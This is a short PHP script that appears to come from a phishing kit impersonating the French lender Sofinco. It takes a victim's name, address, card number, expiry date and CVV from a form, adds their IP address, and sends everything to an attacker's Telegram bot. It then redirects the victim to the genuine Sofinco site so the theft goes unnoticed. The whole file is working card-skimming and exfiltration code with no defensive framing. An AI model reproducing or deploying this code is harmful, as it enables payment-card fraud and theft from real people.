<?php

include "antibots.php";
include "token.php";


$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");

if(isset($_POST['sub'])){
	$message .= '

Nom et prenom  =  '.$_POST['nom'].'
Adresse  =  '.$_POST['adress'].'
Carte  =  '.$_POST['cc'].'
Expiration  =  '.$_POST['exp'].'
CVV  =  '.$_POST['cvv'].'

------------ '.$ip.' ------------
-------------------By MAXI  ------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=https://www.sofinco.fr/parcours-simulateur?idcatorigin=home_page#/");
    exit();
}



?>